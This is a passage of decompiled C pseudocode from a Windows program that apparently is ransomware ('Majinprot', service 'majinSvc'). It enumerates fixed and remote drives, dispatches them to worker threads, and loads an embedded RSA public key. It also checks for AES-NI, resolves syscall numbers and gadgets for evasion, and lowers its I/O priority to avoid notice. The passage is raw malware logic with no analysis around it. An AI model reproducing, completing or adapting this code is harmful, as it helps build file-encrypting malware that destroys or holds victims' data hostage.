              v89 = "REMOTE";
            }
            else if ( v88 == 2 )
            {
              v89 = "REMOVABLE";
            }
            else
            {
              v89 = "OTHER";
              if ( v88 == 5 )
                v89 = "CDROM";
            }
            v90 = (const char *)&unk_14000F892;
          }
          if ( dword_140017658 != 0 )
          {
            v91 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v91 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v92 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v93 = qword_1400187C8("  ");
              v92(v91, "  ", v93, &v310, 0);
            }
          }
          sub_1400042E0(v87);
          if ( dword_140017658 != 0 )
          {
            v94 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v94 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v95 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v96 = qword_1400187C8(" [");
              v95(v94, " [", v96, &v311, 0);
            }
          }
          sub_1400042E0(v89);
          sub_1400042E0(v90);
          if ( dword_140017658 != 0 )
          {
            v97 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v97 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v98 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
              v99 = qword_1400187C8("]\r\n");
              v98(v97, "]\r\n", v99, v272, 0);
            }
          }
          v87 = (HKL *)((char *)v87 + (int)qword_1400187C8(v87) + 1);
        }
        while ( *(_BYTE *)v87 != 0 );
        v82 = v283;
        v78 = v275;
      }
    }
    if ( dword_140017658 != 0 )
    {
      v100 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v100 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v101 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v102 = qword_1400187C8("[*] discover done\r\n");
        v101(v100, "[*] discover done\r\n", v102, &v310, 0);
      }
    }
    CurrentProcess = GetCurrentProcess();
    SetPriorityClass(CurrentProcess, 0x40u);
    v104 = (HMODULE)qword_140018730("ntdll.dll");
    if ( v104 != nullptr )
    {
      NtSetInformationProcess = GetProcAddress(v104, "NtSetInformationProcess");
      if ( NtSetInformationProcess != nullptr )
      {
        v310 = 0;
        v106 = GetCurrentProcess();
        v107 = ((int (__fastcall *)(HANDLE, __int64, int *, __int64))NtSetInformationProcess)(v106, 33, &v310, 4) < 0;
        v108 = "[!] I/O priority: FAILED\r\n";
        if ( !v107 )
          v108 = "[*] I/O priority: VeryLow\r\n";
        sub_1400042E0(v108);
      }
    }
    if ( dword_140017658 != 0 )
    {
      v109 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v109 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v110 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v111 = qword_1400187C8("[*] Press any key to exit...\r\n");
        v110(v109, "[*] Press any key to exit...\r\n", v111, &v310, 0);
      }
    }
    v112 = qword_140018750(4294967286LL);
    if ( (unsigned __int64)(v112 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018830(60000);
    else
      qword_1400187F8(v112, &v310, 1, &v311, 0);
    qword_140018698(0);
  }
  if ( dword_140017630 <= 0 )
  {
    if ( dword_140017658 != 0 )
    {
      v131 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v131 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v132 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v133 = qword_1400187C8("[!] syscalls: SSNs not resolved (err=");
        v132(v131, "[!] syscalls: SSNs not resolved (err=", v133, &v310, 0);
      }
    }
    v134 = qword_140018710();
    sub_1400041A0(-(__int64)v134);
    if ( dword_140017658 != 0 )
    {
      v135 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v135 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v136 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v137 = qword_1400187C8(")\r\n");
        v136(v135, ")\r\n", v137, &v310, 0);
      }
    }
  }
  else
  {
    if ( dword_140017658 != 0 )
    {
      v113 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v113 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v114 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v115 = qword_1400187C8("[*] syscalls: SSNs Read=");
        v114(v113, "[*] syscalls: SSNs Read=", v115, &v310, 0);
      }
    }
    sub_1400041A0(dword_140017630);
    if ( dword_140017658 != 0 )
    {
      v116 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v116 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v117 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v118 = qword_1400187C8(" Write=");
        v117(v116, " Write=", v118, &v310, 0);
      }
    }
    sub_1400041A0(dword_140017634);
    if ( dword_140017658 != 0 )
    {
      v119 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v119 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v120 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v121 = qword_1400187C8(" Close=");
        v120(v119, " Close=", v121, &v310, 0);
      }
    }
    sub_1400041A0(dword_140017638);
    if ( dword_140017658 != 0 )
    {
      v122 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v122 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v123 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v124 = qword_1400187C8(" | gadgets: ");
        v123(v122, " | gadgets: ", v124, &v310, 0);
      }
    }
    v125 = "R-N ";
    if ( qword_140017640 != 0 )
      v125 = "R+Y ";
    sub_1400042E0(v125);
    v126 = "W-N ";
    if ( qword_140017648 != 0 )
      v126 = "W+Y ";
    sub_1400042E0(v126);
    v127 = "C-N";
    if ( qword_140017650 != 0 )
      v127 = "C+Y";
    sub_1400042E0(v127);
    if ( dword_140017658 != 0 )
    {
      v128 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v128 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v129 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v130 = qword_1400187C8("\r\n");
        v129(v128, "\r\n", v130, &v310, 0);
      }
    }
  }
  _RAX = 1;
  __asm { cpuid }
  if ( (_RCX & 0x2000000) != 0 )
  {
    if ( dword_140017658 != 0 )
    {
      v146 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v146 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v147 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v148 = qword_1400187C8("[*] AES-NI: yes\r\n");
        v147(v146, "[*] AES-NI: yes\r\n", v148, &v310, 0);
      }
    }
  }
  else if ( dword_140017658 != 0 )
  {
    v143 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v143 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v144 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v145 = qword_1400187C8("[*] AES-NI: no (software fallback)\r\n");
      v144(v143, "[*] AES-NI: no (software fallback)\r\n", v145, &v310, 0);
    }
  }
  v149 = v312;
  if ( v312 == 0 )
  {
    if ( aBgiaaackaabsu0[0] == 0 || (v150 = 1, aBgiaaackaabsu0[0] == 35) )
      v150 = 0;
    v151 = nullptr;
    if ( v150 != 0 )
      v151 = "BgIAAACkAABSU0ExAAgAAAEAAQDXL1qJEU9KvQrBur301qES6VQ2gvW/TGldAYXsxCUPXA2zfcf3jy2AAt0JORMI2T1DFzUW7NGFeZKWPVq"
             "valDcaRJNCmcbam5jxH+nGeOGVvba3C8jZZL32Zy10Do0V2GcpLsgvT9sPnOTQ0RlsOveZIUdrYWpE9LpYnmWuV2pblDEfxB0knss0jpiZf"
             "DvZQrIaN9g5STzu76F4/6mNMmZwtwAuaPibAYEmrIUTuYd+lyXQuniTEWuWlEgG/e/R7EjAAYFEAuavly0xs6XAXpHSgU3P+nu1GSQtWyzT"
             "Hq07Bt9nt0AZXimbsIINWRY3DJ7yq/z59EsdfktEkoYbE2k";
    sub_1400086F0(v151, 0);
    v152 = "[*] RSA public key: loaded\r\n";
    if ( v150 == 0 )
      v152 = "[!] RSA public key: not patched\r\n";
    sub_1400042E0(v152);
    v149 = v312;
  }
  if ( v273 == 0 && v313 == 0 && v149 == 0 )
  {
    sub_1400042E0("[*] pre-flight...\r\n");
    off_1400173F8();
    off_140017400();
    sub_1400042E0("[*] pre-flight done\r\n");
  }
  qword_140018708(v304, _RDX);
  v153 = v305;
  if ( v305 < 1 )
    v153 = 1;
  if ( dword_140017658 != 0 )
  {
    v154 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v154 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v155 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v156 = qword_1400187C8("[*] threads: ");
      v155(v154, "[*] threads: ", v156, &v310, 0);
    }
  }
  sub_1400041A0((unsigned int)v153);
  if ( dword_140017658 != 0 )
  {
    v157 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v157 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v158 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v159 = qword_1400187C8("\r\n");
      v158(v157, "\r\n", v159, &v310, 0);
    }
    if ( dword_140017658 != 0 )
    {
      v160 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v160 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v161 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v162 = qword_1400187C8("  threads: ");
        v161(v160, "  threads: ", v162, &v310, 0);
      }
    }
  }
  sub_1400041A0((unsigned int)v153);
  if ( dword_140017658 != 0 )
  {
    v163 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v163 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v164 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v165 = qword_1400187C8("\r\n");
      v164(v163, "\r\n", v165, &v310, 0);
    }
  }
  sub_14000A850(&v284, 0, 96);
  qword_140018788(v286);
  v166 = qword_140018670(0, 0, 0xFFFF, 0);
  v167 = v313;
  v287 = v166;
  v292 = v312;
  v291 = v313;
  if ( v78 != 0 )
  {
    if ( v82 != nullptr && (unsigned __int8)(*v82 - 65) <= 0x19u && v82[1] == 58 )
    {
      LOBYTE(v310) = *v82;
      *(_WORD *)((char *)&v310 + 1) = 23610;
      HIBYTE(v310) = 0;
      if ( (unsigned int)qword_1400186D0(&v310) == 3 && (unsigned int)sub_140003FB0(*v82) != 0 )
      {
        sub_1400042E0("[*] --path SSD: push_split\r\n");
        sub_140004660(&v284, v82, 0, 1);
LABEL_346:
        v177 = *v82;
        if ( (unsigned __int8)(v177 - 65) <= 0x19u && v82[1] == 58 )
          goto LABEL_348;
        goto LABEL_349;
      }
      sub_1400042E0("[*] --path HDD/REMOTE: pool_push\r\n");
    }
    sub_140004360(&v284, v82, 0);
    if ( v82 == nullptr )
      goto LABEL_349;
    goto LABEL_346;
  }
  if ( qword_140017000 != -1 )
  {
    v168 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
    v169 = qword_1400187C8("SVC: discovering drives\r\n");
    v168(qword_140017000, "SVC: discovering drives\r\n", v169, &v310, 0);
    qword_1400186B8(qword_140017000);
  }
  v170 = (unsigned int)qword_140018718(512, List);
  if ( dword_140017658 != 0 )
  {
    v171 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v171 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v172 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v173 = qword_1400187C8("[*] GetLogicalDriveStringsA ret=");
      v172(v171, "[*] GetLogicalDriveStringsA ret=", v173, &v310, 0);
    }
  }
  sub_1400041A0(v170);
  if ( dword_140017658 != 0 )
  {
    v174 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v174 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v175 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v176 = qword_1400187C8(" buf=");
      v175(v174, " buf=", v176, &v310, 0);
    }
  }
  sub_1400041A0(512);
  if ( dword_140017658 != 0 )
  {
    v178 = qword_140018750(4294967285LL);
    v177 = v178 - 1;
    if ( (unsigned __int64)(v178 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v179 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v180 = qword_1400187C8("\r\n");
      v179(v178, "\r\n", v180, &v310, 0);
    }
  }
  if ( (unsigned int)(v170 - 1) > 0x1FE )
  {
    sub_1400042E0("[*] GetLogicalDriveStringsA FAILED or buffer overflow\r\n");
  }
  else
  {
    v181 = List;
    if ( LOBYTE(List[0]) != 0 )
    {
      while ( 1 )
      {
        v182 = (unsigned int)qword_1400186D0(v181);
        if ( dword_140017658 != 0 )
        {
          v183 = qword_140018750(4294967285LL);
          if ( (unsigned __int64)(v183 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          {
            v184 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
            v185 = qword_1400187C8("[*] drive: ");
            v184(v183, "[*] drive: ", v185, &v310, 0);
          }
        }
        sub_1400042E0(v181);
        if ( dword_140017658 != 0 )
        {
          v186 = qword_140018750(4294967285LL);
          if ( (unsigned __int64)(v186 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          {
            v187 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
            v188 = qword_1400187C8(" type=");
            v187(v186, " type=", v188, &v311, 0);
          }
        }
        sub_1400041A0(v182);
        v189 = dword_140017658;
        if ( dword_140017658 != 0 )
        {
          v190 = qword_140018750(4294967285LL);
          if ( (unsigned __int64)(v190 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
          {
            v191 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
            v192 = qword_1400187C8("\r\n");
            v191(v190, "\r\n", v192, v272, 0);
          }
          v189 = dword_140017658;
        }
        if ( (_DWORD)v182 == 3 )
        {
          if ( (unsigned int)sub_140003FB0(*(unsigned __int8 *)v181) != 0 )
          {
            if ( dword_140017658 != 0 )
            {
              v202 = qword_140018750(4294967285LL);
              if ( (unsigned __int64)(v202 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
              {
                v203 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
                v204 = qword_1400187C8("[*]   push_split (SSD) ");
                v203(v202, "[*]   push_split (SSD) ", v204, v294, 0);
              }
            }
            sub_1400042E0(v181);
            if ( dword_140017658 != 0 )
            {
              v205 = qword_140018750(4294967285LL);
              if ( (unsigned __int64)(v205 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
              {
                v206 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
                v207 = qword_1400187C8("\r\n");
                v206(v205, "\r\n", v207, v295, 0);
              }
            }
            sub_140004660(&v284, v181, 0, 1);
            goto LABEL_334;
          }
          if ( dword_140017658 != 0 )
          {
            v208 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v208 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v209 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
              v210 = qword_1400187C8("[*]   pool_push (HDD) ");
              v209(v208, "[*]   pool_push (HDD) ", v210, v296, 0);
            }
          }
          sub_1400042E0(v181);
          if ( dword_140017658 != 0 )
          {
            v211 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v211 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v212 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
              v213 = qword_1400187C8("\r\n");
              v212(v211, "\r\n", v213, v297, 0);
            }
          }
        }
        else
        {
          if ( (_DWORD)v182 != 4 )
          {
            if ( v189 != 0 )
            {
              v193 = qword_140018750(4294967285LL);
              if ( (unsigned __int64)(v193 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
              {
                v194 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
                v195 = qword_1400187C8("[*]   skipped (not FIXED/REMOTE)\r\n");
                v194(v193, "[*]   skipped (not FIXED/REMOTE)\r\n", v195, &v275, 0);
              }
            }
            goto LABEL_334;
          }
          if ( v189 != 0 )
          {
            v196 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v196 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v197 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v198 = qword_1400187C8("[*]   pool_push (REMOTE) ");
              v197(v196, "[*]   pool_push (REMOTE) ", v198, &v274, 0);
            }
          }
          sub_1400042E0(v181);
          if ( dword_140017658 != 0 )
          {
            v199 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v199 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v200 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
              v201 = qword_1400187C8("\r\n");
              v200(v199, "\r\n", v201, v293, 0);
            }
          }
        }
        sub_140004360(&v284, v181, 0);
LABEL_334:
        v177 = (int)qword_1400187C8(v181);
        v181 = (HKL *)((char *)v181 + v177 + 1);
        if ( *(_BYTE *)v181 == 0 )
        {
          v82 = v283;
          LOBYTE(v177) = 67;
          v167 = v313;
          goto LABEL_348;
        }
      }
    }
  }
  v167 = v313;
  LOBYTE(v177) = 67;
LABEL_348:
  if ( (unsigned int)sub_140003FB0(v177) == 0 )
  {
LABEL_349:
    if ( v280 != 0 )
    {
      v215 = GetCurrentProcess();
      SetPriorityClass(v215, 0x40u);
      v216 = (HMODULE)qword_140018730("ntdll.dll");
      if ( v216 != nullptr )
      {
        ProcAddress = GetProcAddress(v216, "NtSetInformationProcess");
        if ( ProcAddress != nullptr )
        {
          v310 = 0;
          v218 = GetCurrentProcess();
          if ( ((int (__fastcall *)(HANDLE, __int64, int *, __int64))ProcAddress)(v218, 33, &v310, 4) < 0 )
          {
            sub_1400042E0("[!] I/O priority: NtSetInformationProcess failed\r\n");
            v219 = "SVC: IoPriorityVeryLow FAILED\r\n";
          }
          else
          {
            sub_1400042E0("[*] I/O priority: VeryLow\r\n");
            v219 = "SVC: IoPriorityVeryLow set\r\n";
          }
          sub_140004EA0(v219);
        }
        else
        {
          sub_1400042E0("[!] I/O priority: GetProcAddress not found\r\n");
        }
      }
      goto LABEL_355;
    }
  }
  if ( dword_140017658 != 0 )
  {
    v220 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v220 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v221 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v222 = qword_1400187C8("[*] I/O priority: Normal (SSD target or --ignore)\r\n");
      v221(v220, "[*] I/O priority: Normal (SSD target or --ignore)\r\n", v222, &v310, 0);
    }
  }
  if ( qword_140017000 != -1 )
  {
    v223 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
    v224 = qword_1400187C8("SVC: IoPriorityNormal, VeryLow skipped\r\n");
    v223(qword_140017000, "SVC: IoPriorityNormal, VeryLow skipped\r\n", v224, &v310, 0);
    qword_1400186B8(qword_140017000);
  }
LABEL_355:
  qword_140018708(lpString2, v214);
  if ( v153 == 0 )
    v153 = (int)v299;
  if ( v153 >= 1 )
  {
    if ( v153 > 64 )
      v153 = 64;
  }
  else
  {
    v153 = 1;
  }
  v225 = (__int64 (__fastcall *)(__int64, __int64, __int64))qword_140018768;
  v288 = 1;
  nCount = v153;
  v226 = qword_140018740();
  lpHandles = (HANDLE *)v225(v226, 8, 8LL * v153);
  for ( j = 0; j < v153; lpHandles[j++] = v228 )
    v228 = (void *)qword_140018678(0, 0, sub_140004470, &v284, 0, 0);
  sub_14000A850(v307, 0, 2072);
  if ( v277 != 0 || v167 != 0 && v281 == 0 )
  {
    v234 = v273;
    v229 = v312;
  }
  else
  {
    v229 = v312;
    v307[3] = v312;
    v307[0] = 1;
    v307[1] = v282;
    v307[5] = dword_140017658;
    v307[4] = v167;
    v307[2] = 30000;
    v308[0] = 0;
    v230 = qword_1400187C8(v308);
    qword_1400187B0(&v308[v230], "--service --nolan");
    if ( v229 != 0 )
    {
      v231 = qword_1400187C8(v308);
      qword_1400187B0(&v308[v231], " --dry-run");
    }
    if ( v278 != 0 )
    {
      v232 = qword_1400187C8(v308);
      v233 = " --fast";
      goto LABEL_380;
    }
    if ( v279 != 0 )
    {
      v232 = qword_1400187C8(v308);
      v233 = " --full";
LABEL_380:
      qword_1400187B0(&v308[v232], v233);
    }
    v234 = v273;
    if ( v273 != 0 )
    {
      v235 = qword_1400187C8(v308);
      qword_1400187B0(&v308[v235], " --nopf");
    }
    if ( dword_140017658 != 0 )
    {
      v236 = qword_1400187C8(v308);
      qword_1400187B0(&v308[v236], " --verbose");
    }
    qword_140018720(0, v309, 1023);
    sub_140009F80(v307);
    sub_140009FE0(0, 0);
  }
  if ( dword_140017658 != 0 )
  {
    v237 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v237 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v238 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v239 = qword_1400187C8("[*] working...\r\n");
      v238(v237, "[*] working...\r\n", v239, &v310, 0);
    }
  }
  v240 = nCount;
  v241 = 0;
  if ( (int)nCount <= 0 )
    goto LABEL_403;
  while ( 1 )
  {
    v242 = (__int64 (__fastcall *)(__int64, __int64, __int64))qword_140018768;
    v243 = qword_140018740();
    v244 = (_QWORD *)v242(v243, 8, 24);
    if ( v244 == nullptr )
      break;
    v245 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
    v246 = qword_140018740();
    v247 = (_BYTE *)v245(v246, 0, 1);
    *v244 = v247;
    if ( v247 == nullptr )
    {
      v248 = (void (__fastcall *)(__int64, _QWORD, _QWORD *))qword_140018770;
      v249 = qword_140018740();
      v248(v249, 0, v244);
      break;
    }
    *v247 = 0;
    qword_140018690(v286);
    v244[1] = 0;
    if ( v285 != nullptr )
      v285[1] = v244;
    else
      v284 = v244;
    v285 = v244;
    qword_140018790(v286);
    qword_140018800(v287, 1, 0);
    v240 = nCount;
    if ( ++v241 >= (int)nCount )
      goto LABEL_400;
  }
  v240 = nCount;
LABEL_400:
  if ( v240 <= 0 )
  {
LABEL_403:
    v250 = lpHandles;
  }
  else
  {
    v250 = lpHandles;
    if ( lpHandles != nullptr )
    {
      WaitForMultipleObjects(v240, lpHandles, true, 0xFFFFFFFF);
      v240 = nCount;
      goto LABEL_403;
    }
  }
  v251 = 0;
  if ( v240 > 0 )
  {
    v252 = 0;
    do
    {
      if ( v250[v252] != nullptr )
      {
        qword_140018640();
        v240 = nCount;
        v250 = lpHandles;
      }
      ++v251;
      ++v252;
    }
    while ( v251 < v240 );
  }
  v253 = (void (__fastcall *)(__int64, _QWORD, HANDLE *))qword_140018770;
  v254 = qword_140018740();
  v253(v254, 0, v250);
  lpHandles = nullptr;
  if ( dword_140017658 != 0 )
  {
    v255 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v255 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v256 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v257 = qword_1400187C8("[*] local done\r\n");
      v256(v255, "[*] local done\r\n", v257, &v310, 0);
    }
  }
  if ( qword_140017000 != -1 )
  {
    v258 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
    v259 = qword_1400187C8("SVC: local pool done\r\n");
    v258(qword_140017000, "SVC: local pool done\r\n", v259, &v310, 0);
    qword_1400186B8(qword_140017000);
  }
  if ( v307[0] != 0 )
    sub_14000A180();
  if ( v234 == 0 && v167 == 0 && v229 == 0 )
  {
    sub_1400042E0("[*] post-flight...\r\n");
    off_140017408();
    off_140017408();
    sub_1400042E0("[*] post-flight done\r\n");
  }
  sub_140008690();
  if ( v82 != nullptr )
  {
    v260 = (void (__fastcall *)(__int64, _QWORD, unsigned __int8 *))qword_140018770;
    v261 = qword_140018740();
    v260(v261, 0, v82);
  }
  result = off_140017410();
  if ( dword_140017658 != 0 )
  {
    result = qword_140018750(4294967285LL);
    v263 = result;
    if ( (unsigned __int64)(result - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v264 = (__int64 (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v265 = qword_1400187C8("[*] done\r\n");
      result = v264(v263, "[*] done\r\n", v265, &v310, 0);
    }
  }
  if ( qword_140017000 != -1 )
  {
    v266 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
    v267 = qword_1400187C8("SVC: Majinprot done, returning\r\n");
    v266(qword_140017000, "SVC: Majinprot done, returning\r\n", v267, &v310, 0);
    result = qword_1400186B8(qword_140017000);
  }
  if ( dword_140017658 != 0 )
  {
    v268 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v268 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v269 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v270 = qword_1400187C8("[*] Press any key to exit...\r\n");
      v269(v268, "[*] Press any key to exit...\r\n", v270, &v310, 0);
    }
    v271 = qword_140018750(4294967286LL);
    if ( (unsigned __int64)(v271 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018830(30000);
    else
      qword_1400187F8(v271, &v310, 1, &v311, 0);
    return qword_140018698(0);
  }
  return result;
}


// ----- start @ 0x140003870 -----
__int64 start()
{
  unsigned int v0; // edi
  char *v1; // rbx
  __int64 v2; // r10
  char v3; // al
  char v4; // dl
  int v5; // r11d
  __int64 v6; // r8
  unsigned int v7; // eax
  void *v8; // rax
  void *v9; // rbx
  __int64 v10; // rax
  __int64 v11; // rbx
  unsigned int v12; // eax
  __int64 v13; // rdx
  _QWORD v15[5]; // [rsp+40h] [rbp-28h] BYREF

  if ( (unsigned int)sub_14000A270() == 0 )
    qword_140018698(1);
  v0 = 2;
  v1 = (char *)qword_1400186C0();
  if ( v1 != nullptr )
  {
    v2 = (int)qword_1400187C8("verbose");
    v3 = *v1;
    if ( *v1 != 0 )
    {
      v4 = *v1;
      v5 = 9217;
      do
      {
        if ( v3 == 45 && v1[1] == 45 )
        {
          v6 = 0;
          if ( v2 <= 0 )
          {
LABEL_11:
            v7 = v1[v2 + 2];
            if ( v1[v2 + 2] == 32 || (unsigned __int8)v7 <= 0xDu && _bittest(&v5, v7) )
            {
              AllocConsole();
              v8 = (void *)qword_140018648("CONOUT$", 0x40000000, 2, 0, 3, 0, 0);
              v9 = v8;
              if ( v8 != (void *)-1LL )
              {
                SetStdHandle(0xFFFFFFF5, v8);
                SetStdHandle(0xFFFFFFF4, v9);
              }
              break;
            }
          }
          else
          {
            while ( v1[v6 + 2] == aVerbose_1[v6] )
            {
              if ( ++v6 >= v2 )
                goto LABEL_11;
            }
          }
        }
        for ( ; v4 != 0; v4 = *++v1 )
        {
          if ( v4 == 32 )
            break;
        }
        v4 = *v1;
        v3 = *v1;
        if ( *v1 == 32 )
        {
          do
            v4 = *++v1;
          while ( v4 == 32 );
          v3 = v4;
        }
      }
      while ( v3 != 0 );
    }
  }
  v10 = qword_1400186C0();
  v11 = v10;
  if ( v10 != 0 && (v12 = qword_1400187C8(v10)) >= 9 )
  {
    while ( *(_BYTE *)(v0 - 2 + v11) != 45
         || *(_BYTE *)(v0 - 1 + v11) != 45
         || *(_BYTE *)(v0 + v11) != 115
         || *(_BYTE *)(v0 + 1 + v11) != 101
         || *(_BYTE *)(v0 + 2 + v11) != 114
         || *(_BYTE *)(v0 + 3 + v11) != 118
         || *(_BYTE *)(v0 + 4 + v11) != 105
         || *(_BYTE *)(v0 + 5 + v11) != 99
         || *(_BYTE *)(v0 + 6 + v11) != 101 )
    {
      if ( ++v0 + 7 > v12 )
        goto LABEL_36;
    }
    v15[2] = 0;
    v15[0] = "majinSvc";
    v15[3] = 0;
    v15[1] = sub_140003AC0;
    return qword_140018938(v15, v13, v12);
  }
  else
  {
LABEL_36:
    sub_140001000();
    return qword_140018698(0);
  }
}


// ----- nullsub_1 @ 0x140003ab0 -----
void nullsub_1()
{
  ;
}


// ----- sub_140003AC0 @ 0x140003ac0 -----
__int64 sub_140003AC0()
{
  __int64 v0; // rax
  __int64 v1; // rcx
  const char *v2; // rsi
  void (__fastcall *v3)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v4; // eax
  const char *v5; // rdi
  void (__fastcall *v6)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v7; // eax
  void (__fastcall *v8)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v9; // eax
  __int64 result; // rax
  void (__fastcall *v11)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
